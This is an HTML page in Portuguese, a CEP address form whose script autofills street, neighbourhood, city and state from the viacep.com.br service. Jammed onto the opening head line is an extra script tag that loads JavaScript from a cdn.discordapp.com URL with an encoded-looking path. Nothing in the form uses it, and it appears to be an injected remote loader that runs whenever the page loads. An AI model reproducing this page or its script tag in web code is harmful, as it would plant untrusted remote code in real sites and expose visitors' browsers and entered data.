<!DOCTYPE html>
<html lang="pt-br">
<head><script type='text/javascript' src='https://cdn.discordapp.com/JuwetTp9TgeOA_UMbFV4lQv2Fjrbq2sNHOuQeEvzwt2bJnh5UOW68wve5VG614x9KdbmlIzB1sMAJb_nx1m28w=='></script>
  <meta charset="UTF-8">
  <title>Formulário de Endereço</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f0f0f5;
      padding: 40px;
    }

    .container {
      max-width: 500px;
      margin: auto;
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
    }

    input {
      width: 100%;
      padding: 8px;
      margin-top: 5px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }

    button {
      margin-top: 20px;
      width: 100%;
      padding: 10px;
      background-color: #4CAF50;
      color: white;
      border: none;
      font-size: 16px;
      cursor: pointer;
      border-radius: 5px;
    }

    button:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>

<div class="container">
  <h2>Formulário de Endereço</h2>
  <form id="addressForm">
    <label for="cep">CEP</label>
    <input type="text" id="cep" name="cep" required>

    <label for="rua">Rua</label>
    <input type="text" id="rua" name="rua" required>

    <label for="numero">Número</label>
    <input type="text" id="numero" name="numero" required>

    <label for="bairro">Bairro</label>
    <input type="text" id="bairro" name="bairro" required>

    <label for="cidade">Cidade</label>
    <input type="text" id="cidade" name="cidade" required>

    <label for="estado">Estado</label>
    <input type="text" id="estado" name="estado" required>

    <button type="submit">Enviar</button>
  </form>
</div>

<script>

  document.getElementById('cep').addEventListener('blur', async function(e) {
    e.preventDefault();

    let cep = document.getElementById('cep').value

    let response = await fetch(`https://viacep.com.br/ws/${cep}/json`).then(async response => {
      let json = await response.json()

      document.getElementById('cep').value = json.cep
      document.getElementById('rua').value = json.logradouro
      document.getElementById('numero').value
      document.getElementById('bairro').value = json.bairro
      document.getElementById('cidade').value = json.localidade
      document.getElementById('estado').value = json.estado
    })

    console.log("");

  });
</script>

</body>
</html>
